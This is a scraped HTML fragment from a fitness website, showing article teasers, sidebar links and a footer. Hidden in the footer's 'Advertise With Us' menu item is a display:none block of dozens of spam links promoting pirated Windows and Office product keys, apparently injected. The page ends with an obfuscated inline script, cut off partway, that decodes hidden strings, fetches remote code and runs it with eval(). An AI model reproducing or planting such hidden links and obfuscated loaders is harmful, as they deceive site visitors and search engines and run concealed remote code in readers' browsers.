        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://hyperactivz.com/chest-workouts" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/02/11112046/intense-workout.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">How to Get the Most Out of Your Chest Workout</h2>
                        <p class="meta_post"><span class="meta_post_author">Benny Norman</span> &bull; <span class="meta_post_date">Feb 11, 2018</span></p>

                        <p class="excerpt_item">


There is a good reason why Monday, the start of the week is called the Chest day and considered an important training day. Chest workouts are...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://hyperactivz.com/best-chest-exercises-men-home-train-chest-muscles" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/01/11110033/7-Tricep-Push-Ups-That-Will-Build-Massive-Arms-STACK.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">Best Chest Exercises For Men at Home to Train Chest Muscles</h2>
                        <p class="meta_post"><span class="meta_post_author">Francine Pines</span> &bull; <span class="meta_post_date">Feb 9, 2018</span></p>

                        <p class="excerpt_item">


Men love to show off what they worked for. Many individuals seem to wonder about achieving these same goals, but don’t have time to hit the...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

                <article>
        <a href="http://hyperactivz.com/dont-eat-foods-exercise-burn-fat" class="wrapp_item clearfix">


                    <div class="wrap_img_article">
                        <div class="img_article" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/01/07151206/diet-sugar-e1515330734715.jpg')"></div>
                    </div>


                    <div class="item_text">
                        <h2 class="header_item">Don&#8217;t Eat These Foods After Exercise To Burn More Fat</h2>
                        <p class="meta_post"><span class="meta_post_author">Matthew Jacobson</span> &bull; <span class="meta_post_date">Feb 5, 2018</span></p>

                        <p class="excerpt_item">


Not many people understand that nutrition is more important than exercise. One’s daily diet is more vital to one’s overall health than...</p>

                        <p class="read_more_post">Read more</p>
                    </div>


        </a>
        <div class="category_divider hidden-sm hidden-xs hidden-md" ></div>
    </article>

    
</div><div class="visible-md-block visible-lg-block aside">


    <div class="aside-popular">
		
            <!--        <h2 class="title_block">Entertainment</h2>-->
            <div class="wrap_widget">
			            <!--            <div id='ad_pos_hy-rr-atf' style="text-align:center; margin-bottom: 30px;">-->
            <!--                <script type='text/javascript'>-->
            <!--                    googletag.cmd.push(function() { googletag.display('ad_pos_hy-rr-atf'); });-->
            <!--                </script>-->
            <!--            </div>-->
            <!--        -->            <!--            <div id='ad_pos_hy-tablet-rr-atf' style="text-align:center;">-->
            <!--                <script type='text/javascript'>-->
            <!--                    googletag.cmd.push(function() { googletag.display('ad_pos_hy-tablet-rr-atf'); });-->
            <!--                </script>-->
            <!--            </div>-->
            <!--            <style>.tb_text { display:none;}</style>-->
            <!--        -->					                    <div class="widget"">
                    <div class="three_blocks_item three_blocks_item_post">
                        <a href="http://hyperactivz.com/best-foods-eat-exercise">
                            <div class="tb_img_wrap">
                                <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/01/07150715/Plants_Make_Fruits_and_Vegetablesdreamstime_xxl_50188610-e1515330442325.jpg')"></div>
                            </div>
                            <p class="tb_text">Fitness</p>
                            <p class="meta_post"><span class="meta_post_author">Matthew Jacobson</span>
                                &bull; <span class="meta_post_date">Feb 3, 2018</span></p>
                            <p class="tb_top_meta">Best Foods To Eat After Exercise</p>
                        </a>
                    </div>
                    <!--three_blocks_item_post-->
                    </div>
										                    <div class="widget"">
                    <div class="three_blocks_item three_blocks_item_post">
                        <a href="http://hyperactivz.com/foods-avoid-exercise">
                            <div class="tb_img_wrap">
                                <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/01/07150210/c700x420-e1515330136862.jpg')"></div>
                            </div>
                            <p class="tb_text">Fitness</p>
                            <p class="meta_post"><span class="meta_post_author">Benny Norman</span>
                                &bull; <span class="meta_post_date">Feb 1, 2018</span></p>
                            <p class="tb_top_meta">Foods To Avoid After Exercise</p>
                        </a>
                    </div>
                    <!--three_blocks_item_post-->
                    </div>
										                    <div class="widget"">
                    <div class="three_blocks_item three_blocks_item_post">
                        <a href="http://hyperactivz.com/importance-post-workout-nutrition">
                            <div class="tb_img_wrap">
                                <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/01/07145658/highproteindiets_1280px_97576cceb35a44cd86625a4d974aa827-e1515329829793.jpeg')"></div>
                            </div>
                            <p class="tb_text">Diet And Weight Loss</p>
                            <p class="meta_post"><span class="meta_post_author">Lee Jordan</span>
                                &bull; <span class="meta_post_date">Jan 30, 2018</span></p>
                            <p class="tb_top_meta">The Importance of Post-Workout Nutrition</p>
                        </a>
                    </div>
                    <!--three_blocks_item_post-->
                    </div>
										                    <div class="widget"">
                    <div class="three_blocks_item three_blocks_item_post">
                        <a href="http://hyperactivz.com/5-perfect-post-workout-meals">
                            <div class="tb_img_wrap">
                                <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/01/07145310/Mackerel-LGH-0d44176f-fae4-4711-864b-2ab555c84af8-0-1400x919-e1515329596103.jpg')"></div>
                            </div>
                            <p class="tb_text">Diet And Weight Loss</p>
                            <p class="meta_post"><span class="meta_post_author">Matthew Jacobson</span>
                                &bull; <span class="meta_post_date">Jan 28, 2018</span></p>
                            <p class="tb_top_meta">5 Perfect Post-Workout Meals</p>
                        </a>
                    </div>
                    <!--three_blocks_item_post-->
                    </div>
										                    <div class="widget"">
                    <div class="three_blocks_item three_blocks_item_post">
                        <a href="http://hyperactivz.com/getting-six-pack-abs-often-really-need-train">
                            <div class="tb_img_wrap">
                                <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/01/07144528/the-fastest-way-to-lose-stomach-fat-in-30-days.jpg')"></div>
                            </div>
                            <p class="tb_text">Diet And Weight Loss</p>
                            <p class="meta_post"><span class="meta_post_author">Julie Heinz</span>
                                &bull; <span class="meta_post_date">Jan 26, 2018</span></p>
                            <p class="tb_top_meta">Getting Six Pack Abs- How Often Do You Really Need To Train?</p>
                        </a>
                    </div>
                    <!--three_blocks_item_post-->
                    </div>
										                    <div class="widget"">
                    <div class="three_blocks_item three_blocks_item_post">
                        <a href="http://hyperactivz.com/train-abs-workout">
                            <div class="tb_img_wrap">
                                <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/01/07144748/Core-Training-That-Isnt-Stupid.jpg')"></div>
                            </div>
                            <p class="tb_text">Fitness</p>
                            <p class="meta_post"><span class="meta_post_author">Lee Jordan</span>
                                &bull; <span class="meta_post_date">Jan 24, 2018</span></p>
                            <p class="tb_top_meta">Should You Train Your Abs Before or After Your workout ?</p>
                        </a>
                    </div>
                    <!--three_blocks_item_post-->
                    </div>
										                    <div class="widget"">
                    <div class="three_blocks_item three_blocks_item_post">
                        <a href="http://hyperactivz.com/5-myths-must-stay-away-building-6-pack-abs">
                            <div class="tb_img_wrap">
                                <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/01/07144005/493541956-e1515328811140.jpg')"></div>
                            </div>
                            <p class="tb_text">Diet And Weight Loss</p>
                            <p class="meta_post"><span class="meta_post_author">Joe Nesmith</span>
                                &bull; <span class="meta_post_date">Jan 24, 2018</span></p>
                            <p class="tb_top_meta">5 Myths You Must Stay Away From When Building 6 Pack Abs</p>
                        </a>
                    </div>
                    <!--three_blocks_item_post-->
                    </div>
										                    <div class="widget"">
                    <div class="three_blocks_item three_blocks_item_post">
                        <a href="http://hyperactivz.com/design-workout-abs">
                            <div class="tb_img_wrap">
                                <div class="tb_img" style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/01/07143546/over-40-content-e1515328568277.jpg')"></div>
                            </div>
                            <p class="tb_text">Diet And Weight Loss</p>
                            <p class="meta_post"><span class="meta_post_author">Julie Heinz</span>
                                &bull; <span class="meta_post_date">Jan 22, 2018</span></p>
                            <p class="tb_top_meta">How To Design A Workout For Abs</p>
                        </a>
                    </div>
                    <!--three_blocks_item_post-->
                    </div>
					    </div>
</div>
</div>



            </div>
        </div>
    </div>
</div>
</main>



<footer id="main_footer">
	<div class="container">
		<div class="row">
						
<div class="col-xs-12 col-sm-4 footer_about equal_footer">
  <a class="footer_logo_link" href="http://hyperactivz.com">
          <img src="http://hyperactivz.com/wp-content/themes/hyperaktivz/images/logo.png" alt="HyperActivz" class="footer_logo_image img-responsive">
      </a>

  <div class="about_us widget">
    <h2 class="about_us_head widget-title">about us</h2>
    <p class="about_us_text">HyperActivz is your first GoTo place when it comes to wellness, healthy living, diet, weight loss and fitness. We provide you with the latest news and videos relating these topics.</p>
  </div>

    <div class="footer_social_links">
        <a href="https://www.facebook.com/HyperActivz-750007205152027/" target="_blank"><span class="icon icon-fb"></span></a>
        <a href="https://twitter.com/hyperactivz" target="_blank"><span class="icon icon-tw"></span></a>
    </div>

</div>			    <div class="col-xs-12 col-sm-4 col-sm-4 footer_widget equal_footer hidden-xs">
                <div class="widget">
            <h2 class="popular_post_head widget-title">Trending</h2>

            <ul>
                                                <li>
                    <div class="popular_post_item">
                        <a href="http://hyperactivz.com/5-reasons-abs-arent-showing" class="popular_post_item_link">
                            <p class="popular_post_item_head">5 Reasons Why Your Abs Aren’t Showing</p>
                            <p class="popular_post_item_meta widget_meta">
                                20 Jan, 2018                            </p>
                        </a>
                    </div>
                </li>
                                                <li>
                    <div class="popular_post_item">
                        <a href="http://hyperactivz.com/6-need-know-health-benefits-coffee" class="popular_post_item_link">
                            <p class="popular_post_item_head">6 Need to Know Health Benefits of Coffee</p>
                            <p class="popular_post_item_meta widget_meta">
                                18 Jan, 2018                            </p>
                        </a>
                    </div>
                </li>
                                                <li>
                    <div class="popular_post_item">
                        <a href="http://hyperactivz.com/9-steps-better-cup-coffee" class="popular_post_item_link">
                            <p class="popular_post_item_head">9 Steps to a Better Cup of Coffee</p>
                            <p class="popular_post_item_meta widget_meta">
                                16 Jan, 2018                            </p>
                        </a>
                    </div>
                </li>
                            </ul>
        </div>
    </div>

            
    <div class="col-xs-12 col-sm-4 col-sm-4 footer_follow equal_footer">

                <div class="aside-popular small_block">
            <div class="widget">
                <h2 class="popular_post_head widget-title">POPULAR POSTS</h2>
                                    
                <div class="wb_right">
                    <a href="http://hyperactivz.com/5-ways-build-muscles-skinny-guys">
                        <div class="wb_right_img_wrap">
                            <div class="wb_right_img"
                                 style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/01/11113014/bulking-for-ectomorphs-headerv2-960x540-e1515663022225.jpg')"></div>
                        </div>
                        <div class="wb_right_text_wrap">
                            <h2 class="wb_right_text">5 Ways To Build Muscles For Skinny Guys</h2>
                            <p class="small-post-date">15 Jan, 2018</p>
                        </div>
                    </a>
                </div>

                                    
                <div class="wb_right">
                    <a href="http://hyperactivz.com/coffee-popular-worldwide">
                        <div class="wb_right_img_wrap">
                            <div class="wb_right_img"
                                 style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/01/07141258/1-e1515327185109.jpg')"></div>
                        </div>
                        <div class="wb_right_text_wrap">
                            <h2 class="wb_right_text">Why is Coffee So Popular Worldwide?</h2>
                            <p class="small-post-date">14 Jan, 2018</p>
                        </div>
                    </a>
                </div>

                                    
                <div class="wb_right">
                    <a href="http://hyperactivz.com/the-history-of-coffee">
                        <div class="wb_right_img_wrap">
                            <div class="wb_right_img"
                                 style="background-image: url('http://d1nnx3nhddxmeh.cloudfront.net/wp-content/uploads/2018/01/07140644/coffee_3215701b.jpg')"></div>
                        </div>
                        <div class="wb_right_text_wrap">
                            <h2 class="wb_right_text">The History of Coffee</h2>
                            <p class="small-post-date">12 Jan, 2018</p>
                        </div>
                    </a>
                </div>

                        </div>
        </div>
    </div>
					</div>
	</div>
	
<div id="footer_menu">
  <div class="container">
    <div class="row">
      <div class="col-xs-12">
        <ul id="menu-footer-menu" class="footer_menu"><li id="menu-item-710" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-710"><a title="Terms Of Use" href="http://hyperactivz.com/terms-of-use">Terms Of Use</a></li>
<li id="menu-item-712" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-712"><a title="Privacy Policy" href="http://hyperactivz.com/privacy-policy">Privacy Policy</a></li>
<li id="menu-item-711" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-711"><a title="DMCA" href="http://hyperactivz.com/dmca">DMCA</a></li>
<li id="menu-item-2448" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2448"><a title="Contact Us" href="http://hyperactivz.com/contact-us">Contact Us</a></li>
<li id="menu-item-2449" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2449"><a title="Advertise With Us&lt;div style=&quot;display:none;&quot;&gt; &nbsp;&lt;a href=&quot;http://www.sektor3.wroclaw.pl/&quot;&gt; Windows 7 Home Premium OEM Key &lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.usv-grossarl.at/&quot;&gt;office 2010 professional key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.bombiscoito.ind.br/&quot;&gt;Windows 7 Genuine Product Keys&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://nawadabazaar.com/&quot;&gt;Windows 10 Ultimate Product Key free for You&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://carlosgartner.com.br/&quot;&gt;windows 10 education key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://bigdealtouring.com/&quot;&gt; Windows 10 Activation Product Keys&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://historiccamping.com/&quot;&gt;office 2016 Genuine Product key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.cheapestkey.com/&quot;&gt;Office 2010 Key Download&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.diemacherdracher.de/&quot;&gt;windows 7 ultimate serial numbers&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.windowskeyonsale.com&quot;&gt;windows 7 product key store&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://entretantoeducacao.com.br/&quot;&gt;Product key for window 7 ultimate 64 bit&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://propertieskoroni.gr/&quot;&gt;Windows 7 Ultimate Product Key free for You&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://ficicilaryapi.com.tr/&quot;&gt;windows 7 professional product key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.blinkpubblicita.com/&quot;&gt;Office 2010 professional plus product key working 100%&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://adizesgs.org/&quot;&gt;Microsoft Office 2013 Activ key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.resinbounddrivewayscornwall.co.uk/&quot;&gt;windows 7 SP1 iso&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.vinidrone.com/&quot;&gt;Windows 7 Ultimate Product Key 32bit and 64bit Genuine&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.icedream.com.tr/&quot;&gt;Windows 10 Product Keys 100% Free Working&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://ceo.johobuilders.co.jp/&quot;&gt;Download Windows 8 or 8.1&lt;/a&gt;&lt;/strong&gt; &nbsp;&lt;a href=&quot;http://www.queenstownweddingservices.co.nz/&quot;&gt;Windows 10 Product Key Online&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.panzer-farm.pl/&quot;&gt;Download Windows XP &lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://bpartcomponents.com/&quot;&gt;Windows 7 Home Premium Product Key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://delorr.nl/&quot;&gt;Windows 7 Ultimate Product Key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.panzer-farm.pl/&quot;&gt;Windows 10 Product Keys 100% Working&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.urfalilar.org.tr/&quot;&gt;Get Windows 10 Product Key Online&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://caa.gov.ly/&quot;&gt; Windows XP Product Key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://ibpc.ysn.ru&quot;&gt; Request a New Windows Product Key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.sad-origami.de/&quot;&gt; windows-7-ultimate-product-key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://thedivinestudios.com/&quot;&gt;Office 2013 Genuine Product key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.kmids.ac.th/&quot;&gt; Windows 8 key in the Windows 8.1 installer&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://smartacademy.com.tr/&quot;&gt; Office 2013 Product Key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.museedelaphoto.fr&quot;&gt; Windows 7 Professional Product Key Generator&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.parkbusinessclub.nl/&quot;&gt; Office 2010 Genuine Product key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.sunderaconsulenze.it/&quot;&gt; Windows xp vista Product Key Generator&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://ianpiddington.info&quot;&gt;windows 10 Genuine Product key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://historiccamping.com/&quot;&gt;windows 10 home-key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.kardismarine.it/&quot;&gt;How to Find Your Microsoft Office 2016 Product Key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://jamesmalcolm.net/&quot;&gt;Windows 10 Professional / Ultimate (32 &amp; 64-bit) KEY&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://technika.amsterdam/&quot;&gt;Where Download Windows 8 or 8.1&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.handhhardwoods.com/&quot;&gt; Windows 7 Ultimate Product Key 32-64bit&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://sunrisesecondaryschool.co.za/&quot;&gt;Windows 7 Product Key Generator&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.peliniarreda.com/&quot;&gt;Get Free Windows 7 Product Key for your PC&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://www.bonanafana.com/&quot;&gt;Windows 7 Home Premium SP1 Product Key&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;https://www.adformix.com&quot;&gt;Office 2013 100% Working Product Key Is Here&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://delorr.nl/&quot;&gt;Windows 7 Home Premium  For Fresh&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://altitudemonroe.com/&quot;&gt;Microsoft Office 2010 Product Key Generator Free Download&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://animenipo.com.br&quot;&gt;Windows 7 Ultimate Product Key 64 Bit Free Download&lt;/a&gt;&nbsp;&nbsp;| &nbsp;&lt;a href=&quot;http://internshipguru.co.uk&quot;&gt;Find your product key for Office 2010&lt;/a&gt;&nbsp;&nbsp;| &lt;/div&gt;" href="http://hyperactivz.com/contact-us">Advertise With Us<div style="display:none;"> &nbsp;<a href="http://www.sektor3.wroclaw.pl/"> Windows 7 Home Premium OEM Key </a>&nbsp;&nbsp;| &nbsp;<a href="http://www.usv-grossarl.at/">office 2010 professional key</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.bombiscoito.ind.br/">Windows 7 Genuine Product Keys</a>&nbsp;&nbsp;| &nbsp;<a href="http://nawadabazaar.com/">Windows 10 Ultimate Product Key free for You</a>&nbsp;&nbsp;| &nbsp;<a href="http://carlosgartner.com.br/">windows 10 education key</a>&nbsp;&nbsp;| &nbsp;<a href="http://bigdealtouring.com/"> Windows 10 Activation Product Keys</a>&nbsp;&nbsp;| &nbsp;<a href="http://historiccamping.com/">office 2016 Genuine Product key</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.cheapestkey.com/">Office 2010 Key Download</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.diemacherdracher.de/">windows 7 ultimate serial numbers</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.windowskeyonsale.com">windows 7 product key store</a>&nbsp;&nbsp;| &nbsp;<a href="http://entretantoeducacao.com.br/">Product key for window 7 ultimate 64 bit</a>&nbsp;&nbsp;| &nbsp;<a href="http://propertieskoroni.gr/">Windows 7 Ultimate Product Key free for You</a>&nbsp;&nbsp;| &nbsp;<a href="http://ficicilaryapi.com.tr/">windows 7 professional product key</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.blinkpubblicita.com/">Office 2010 professional plus product key working 100%</a>&nbsp;&nbsp;| &nbsp;<a href="http://adizesgs.org/">Microsoft Office 2013 Activ key</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.resinbounddrivewayscornwall.co.uk/">windows 7 SP1 iso</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.vinidrone.com/">Windows 7 Ultimate Product Key 32bit and 64bit Genuine</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.icedream.com.tr/">Windows 10 Product Keys 100% Free Working</a>&nbsp;&nbsp;| &nbsp;<a href="http://ceo.johobuilders.co.jp/">Download Windows 8 or 8.1</a></strong> &nbsp;<a href="http://www.queenstownweddingservices.co.nz/">Windows 10 Product Key Online</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.panzer-farm.pl/">Download Windows XP </a>&nbsp;&nbsp;| &nbsp;<a href="http://bpartcomponents.com/">Windows 7 Home Premium Product Key</a>&nbsp;&nbsp;| &nbsp;<a href="http://delorr.nl/">Windows 7 Ultimate Product Key</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.panzer-farm.pl/">Windows 10 Product Keys 100% Working</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.urfalilar.org.tr/">Get Windows 10 Product Key Online</a>&nbsp;&nbsp;| &nbsp;<a href="http://caa.gov.ly/"> Windows XP Product Key</a>&nbsp;&nbsp;| &nbsp;<a href="http://ibpc.ysn.ru"> Request a New Windows Product Key</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.sad-origami.de/"> windows-7-ultimate-product-key</a>&nbsp;&nbsp;| &nbsp;<a href="http://thedivinestudios.com/">Office 2013 Genuine Product key</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.kmids.ac.th/"> Windows 8 key in the Windows 8.1 installer</a>&nbsp;&nbsp;| &nbsp;<a href="http://smartacademy.com.tr/"> Office 2013 Product Key</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.museedelaphoto.fr"> Windows 7 Professional Product Key Generator</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.parkbusinessclub.nl/"> Office 2010 Genuine Product key</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.sunderaconsulenze.it/"> Windows xp vista Product Key Generator</a>&nbsp;&nbsp;| &nbsp;<a href="http://ianpiddington.info">windows 10 Genuine Product key</a>&nbsp;&nbsp;| &nbsp;<a href="http://historiccamping.com/">windows 10 home-key</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.kardismarine.it/">How to Find Your Microsoft Office 2016 Product Key</a>&nbsp;&nbsp;| &nbsp;<a href="http://jamesmalcolm.net/">Windows 10 Professional / Ultimate (32 &#038; 64-bit) KEY</a>&nbsp;&nbsp;| &nbsp;<a href="http://technika.amsterdam/">Where Download Windows 8 or 8.1</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.handhhardwoods.com/"> Windows 7 Ultimate Product Key 32-64bit</a>&nbsp;&nbsp;| &nbsp;<a href="http://sunrisesecondaryschool.co.za/">Windows 7 Product Key Generator</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.peliniarreda.com/">Get Free Windows 7 Product Key for your PC</a>&nbsp;&nbsp;| &nbsp;<a href="http://www.bonanafana.com/">Windows 7 Home Premium SP1 Product Key</a>&nbsp;&nbsp;| &nbsp;<a href="https://www.adformix.com">Office 2013 100% Working Product Key Is Here</a>&nbsp;&nbsp;| &nbsp;<a href="http://delorr.nl/">Windows 7 Home Premium  For Fresh</a>&nbsp;&nbsp;| &nbsp;<a href="http://altitudemonroe.com/">Microsoft Office 2010 Product Key Generator Free Download</a>&nbsp;&nbsp;| &nbsp;<a href="http://animenipo.com.br">Windows 7 Ultimate Product Key 64 Bit Free Download</a>&nbsp;&nbsp;| &nbsp;<a href="http://internshipguru.co.uk">Find your product key for Office 2010</a>&nbsp;&nbsp;| </div></a></li>
<li id="menu-item-2450" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2450"><a title="Work With Us" href="http://hyperactivz.com/contact-us">Work With Us</a></li>
</ul>        <div class="copyright">
          <h1 class="copyright_head">&copy; <script>document.write(new Date().getFullYear());</script> hyperactivz. All rights reserved.</h1>
        </div>
      </div>
    </div>
  </div>
</div>
</footer>



<script type="text/javascript">
  window._taboola = window._taboola || [];
  _taboola.push({flush: true});
</script>

<script>
  try{!function(){function B(){try{var n=K()}catch(a){}if(n)try{C(n.h,null)}catch(a){delete window.localStorage[n.key],delete window.sessionStorage[n.key]}else L(function(n,a){a.as=!0;try{C(n,a)}catch(t){}},M)}function M(){var n=a(window.location.protocol==a("HBkAHABN")?"HBkAHABNRUw=":"HBkAHElYRQ==");(new Image).src=n+u+N}function L(n,a){function t(){var e=A.shift();if(e)try{e(n,t)}catch(o){t()}else v(),a()}try{O()}catch(e){return v(),void a()}var A=[P,Q,R,S];t()}function C(a,c){!function(){eval(a)}({e:a,p:c,n:g})}function K(){var n=[];window.localStorage&&n.push(window.localStorage),window.sessionStorage&&n.push(window.sessionStorage);var t=D(a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),E(a("BB8RDR4VBgY=")));t=new Uint8Array(t);for(var e="",A=0;A<t.length;A++)e+=String.fromCharCode(t[A]);for(t=btoa(e),e=(new Date).getTime(),A=0;A<n.length;A++){var o,c=n[A];for(o in c)if(0===o.lastIndexOf(t,0)){try{for(var w=a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),i=atob(c[o]),B=new Uint8Array(i.length),l=0;l<i.length;l++)B[l]=i.charCodeAt(l);var g=r(D(w,B.buffer))}catch(u){continue}if(l=parseInt(g.substring(0,13),10),!isNaN(l))if(e-l>864e5||1>e-l)c.removeItem(o);else if((l=g.substring(13))&&!(16>l.length))return{h:l,key:o}}}return null}function Q(n,t){var e=a("R1lDVA=="),A=a("Qy9OX0VNXydDVk5bIjhdWStWLkpeTk1cK0pJOCBcV0ZOKTdWMTVQIkxeRFlZO1NbKFpVR1VNT1ZXS0RDJVZeTkNXQFpJNFlZP1FNUiZDJVBQKVpJUUJDJF9DR0xZIyI=");e=w+":"+e;var o={};o[a("AR8YHw==")]=a("ABgGAkk=")+e+a("SxkGDR0EGgwLEEoVAAk="),o[a("Fx8RCBYZHgoYCA==")]=a("DQwABR4W"),o[a("AR4RHh0WBwY=")]=a("DQwABR4W"),F(A,o,function(n){return n=n.match(new RegExp(a("Kg4VAhceDgINAU09B1JHPQ5HT1tbTQwCHQUmPTNPRCoQRlRELxNBP1c4E0o/VzsFQTBBLwBcUEYxHVhZFx8UVgYIGA0K"))),null==n?null:(n=n[1],a("FwwaCBoTCxccXkZBUlkyJTpMV0BXRktQXlk=")+n+a("VFtHXEJBShcAFFcTBhUGGEoeDhcABVk=")+n+a("VB8EAwEDSlVKVEZXQxcCFR0DHRhJFBYVGVlD"))},n,t)}function R(n,t){var e=a("Ql1EXQ=="),A=a("MlhOLTFNUlpDIUNbV0hdWFtWWEpeREpcXUtJO1tcUzdOWDZWNkZQJUxeQ1dZTiJbLClVRiJNS1JXQTVDISNeQjFXRy9JMilZTlxNUVVDUlJQLV1JVzFDUixDREBZX1w=");e=w+":"+e;var o={};o[a("AR8YHw==")]=[a("BxkBAkk=")+e],F(A,o,function(n){return n=n.match(new 